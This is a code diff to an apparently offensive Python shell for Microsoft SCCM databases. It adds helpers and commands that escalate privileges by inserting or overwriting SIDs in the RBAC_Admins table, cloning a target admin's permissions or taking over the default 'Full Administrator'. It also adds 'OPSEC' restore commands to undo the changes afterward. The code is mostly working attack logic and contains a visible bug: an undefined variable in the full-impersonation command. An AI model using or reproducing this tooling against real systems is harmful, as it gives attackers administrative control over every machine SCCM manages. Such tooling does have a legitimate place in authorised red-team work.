@@ -134,8 +134,10 @@ class SCCM_SQLSHELL(cmd.Cmd):
     sccm_remove_admin [Username]         - Remove a user from all SCCM admin roles
 
     sccm_impersonate_safe [your_user] [target_user]     - Safely impersonate a target admin
-    sccm_impersonate_full [your_user]                   - Impersonate the default "Full Administrator"
     sccm_impersonate_targeted [your_user] [target_user] - Impersonate a target admin
+    sccm_impersonate_full [your_user]                   - Impersonate the default "Full Administrator"
+    sccm_restore_targeted [SID_encoded] [target_user]   - Restore target user's SID to the one specified
+    sccm_restore_full [SID_encoded]                     - Restore default FA's SID to the one specified
 
     """
         )
@@ -598,8 +600,43 @@ class SCCM_SQLSHELL(cmd.Cmd):
             logging.error("Failed to load PowerShell script")
             logging.error(e)
     
+    #
+    # Extended features start here:
+    #
+
+    """ 
+    Helper to grab SID of user and hex encode it.
+
+    Input: Unique username (e.g. domain\\username)
+    Output: Hex encoded SID
     """
-    sccm_add_admin [Username] [Role]     - Add a user to a SCCM admin role
+    def user_to_sid(self, user):
+        rows = self.__run_silent(f"SELECT SID0 FROM dbo.v_R_User WHERE Unique_User_Name0 = '{user}';")
+        if not rows:
+            logging.error("Unique username not found. Try domain\\username")
+            return
+        sid = rows[0]['SID0']
+        logging.debug(f"Grabbed SID of {user}: {sid}")
+        hexsid = ldaptypes.LDAP_SID()
+        hexsid.fromCanonical(sid)
+        sid_enc = ('0x' + ''.join('{:02X}'.format(b) for b in hexsid.getData()))
+        logging.debug(f"Hex encoded SID: {sid_enc}")
+        return sid_enc
+
+    """
+    Helper to get hex encoded SID of default "Full Administrator"
+    """
+    def full_admin_sid(self):
+        rows = self.__run_silent(f"SELECT AdminSID FROM RBAC_Admins WHERE AdminID = 16777217")
+        if not rows:
+            logging.error("Unique username not found. Try domain\\username")
+            return
+        sid_enc = rows[0]['AdminSID']
+        sid_formatted = "0x" + sid_enc.decode()
+        return sid_formatted
+
+    """
+    sccm_add_admin [Username] [Role]  - Add a user to a SCCM admin role
     """
     def do_sccm_add_admin(self, arg=""):
         split_arg = arg.split()
@@ -612,16 +649,7 @@ class SCCM_SQLSHELL(cmd.Cmd):
         logging.debug(f"Adding {username} to {role}")
 
         # Grab SID
-        rows = self.__run_silent(f"SELECT SID0 FROM dbo.v_R_User WHERE Unique_User_Name0 = '{username}';")
-        if not rows:
-            logging.error("Unique username not found. Try domain\\username")
-            return
-        sid = rows[0]['SID0']
-        logging.debug(f"Grabbed SID of {username}: {sid}")
-        hexsid = ldaptypes.LDAP_SID()
-        hexsid.fromCanonical(sid)
-        sid_enc = ('0x' + ''.join('{:02X}'.format(b) for b in hexsid.getData()))
-        logging.debug(f"Hex encoded SID: {sid_enc}")
+        sid_enc = self.user_to_sid(username)
 
         # Hash table for role permissions:
         perms = {
@@ -652,7 +680,7 @@ class SCCM_SQLSHELL(cmd.Cmd):
         self.__run(query)
 
     """
-    sccm_remove_admin [Username]         - Remove a user from all SCCM admin roles
+    sccm_remove_admin [Username]  - Remove a user from all SCCM admin roles
     """
     def do_sccm_remove_admin(self, arg=""):
         split_arg = arg.split()
@@ -668,7 +696,88 @@ class SCCM_SQLSHELL(cmd.Cmd):
         query = f"DELETE FROM RBAC_Admins WHERE AdminID = (SELECT TOP 1 AdminID FROM RBAC_Admins WHERE LogonName = '{username}' ORDER BY AdminID DESC);"
         self.__run(query)
 
+    """
+    sccm_impersonate_safe [your_user] [target_user]  - Safely impersonate a target admin
+    """
+    def do_sccm_impersonate_safe(self, arg=""):
+        split_arg = arg.split()
+        if len(split_arg) != 2:
+            logging.error("Did not get expected 2 arguments [your_user] and [target_user]")
+            return
+        your_user = split_arg[0]
+        target_user = split_arg[1]
 
+        # Grab SID
+        sid_enc = self.user_to_sid(your_user)
+
+        query = f"INSERT INTO RBAC_Admins (AdminSID, LogonName, DisplayName, IsGroup, IsDeleted, CreatedBy, CreatedDate, ModifiedBy, ModifiedDate, SourceSite, DistinguishedName, AccountType) SELECT {sid_enc}, LogonName, DisplayName, IsGroup, IsDeleted, CreatedBy, CreatedDate, ModifiedBy, ModifiedDate, SourceSite, DistinguishedName, AccountType FROM RBAC_Admins; DECLARE @oldAdminID INT; DECLARE @newAdminID INT; SET @oldAdminID = (SELECT TOP 1 AdminID FROM RBAC_Admins WHERE LogonName = '{target_user}'); SET @newAdminID = (SELECT TOP 1 AdminID FROM RBAC_Admins WHERE LogonName = '{target_user}' ORDER BY AdminID DESC); INSERT INTO RBAC_ExtendedPermissions (AdminID, RoleID, ScopeID, ScopeTypeID) SELECT @newAdminID, RoleID, ScopeID, ScopeTypeID FROM RBAC_ExtendedPermissions WHERE AdminID = @oldAdminID;"
+        self.__run(query)
+
+    """
+    sccm_impersonate_targeted [your_user] [target_user]  - Impersonate a target admin
+    """
+    def do_sccm_impersonate_targeted(self, arg=""):
+        split_arg = arg.split()
+        if len(split_arg) != 2:
+            logging.error("Did not get expected 2 arguments [your_user] and [target_user]")
+            return
+        your_user = split_arg[0]
+        target_user = split_arg[1]
+
+        # Grab SIDs
+        sid_enc_you = self.user_to_sid(your_user)
+        sid_enc_target = self.user_to_sid(target_user)
+        logging.info(f"OPSEC: You have overwritten the SID of the target user.")
+        logging.info(f"Restore command: sccm_restore_targeted {sid_enc_target} {target_user}")
+
+        query = f"UPDATE RBAC_Admins SET AdminSID = {sid_enc_you} WHERE AdminSID = {sid_enc_target}"
+        self.__run(query)
+
+    """
+    sccm_impersonate_full [your_user]  - Impersonate the default "Full Administrator"
+    """
+    def do_sccm_impersonate_full(self, arg=""):
+        split_arg = arg.split()
+        if len(split_arg) != 1:
+            logging.error("Did not get expected argument [your_user]")
+            return
+        your_user = split_arg[0]
+
+        sid_backup = self.full_admin_sid()
+        logging.info(f"OPSEC: You have overwritten the SID of the default admin.")
+        logging.info(f"Restore command: sccm_restore_full {sid_enc_target}")
+
+        sid_new = self.user_to_sid(your_user)
+
+        query = f"UPDATE RBAC_Admins SET AdminSID = {sid_new} WHERE AdminID = 16777217;"
+        self.__run(query)
+    
+    """
+    sccm_restore_targeted [SID_encoded] [target_user]   - Restore target user's SID to the one specified
+    """
+    def do_sccm_restore_targeted(self, arg=""):
+        split_arg = arg.split()
+        if len(split_arg) != 2:
+            logging.error("Did not get expected 2 arguments [SID_encode] and [target_user]")
+            return
+        SID_encoded = split_arg[0]
+        target_user = split_arg[1]
+
+        query = f"DECLARE @AdminID INT; SET @AdminID = (SELECT TOP 1 AdminID FROM RBAC_Admins WHERE LogonName = '{target_user}'); UPDATE RBAC_Admins SET AdminSID = {SID_encoded} WHERE AdminID = @AdminID;"
+        self.__run(query)
+
+    """
+    sccm_restore_full [SID_encoded]  - Restore default FA's SID to the one specified
+    """
+    def do_sccm_restore_full(self, arg=""):
+        split_arg = arg.split()
+        if len(split_arg) != 1:
+            logging.error("Did not get expected argument [SID_encoded]")
+            return
+        SID_encoded = split_arg[0]
+
+        query = f"UPDATE RBAC_Admins SET AdminSID = {SID_encoded} WHERE AdminID = 16777217;"
+        self.__run(query)
 
 if __name__ == "__main__":
 
